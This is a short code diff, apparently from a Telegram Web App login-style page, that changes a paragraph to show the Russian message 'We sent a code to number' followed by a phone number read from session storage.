@@ -8,7 +8,7 @@ tg.MainButton.show();
 let passwordInput = document.querySelector('input');
 var number = sessionStorage.getItem('number');
 
-document.getElementById("p").innerHTML = `${number}`;
+document.getElementById("p").innerHTML = `Отправили код на номер ${number}`;
 
 document.addEventListener( 'click', (e) => {
 	const withinBoundaries = e.composedPath().includes(passwordInput);
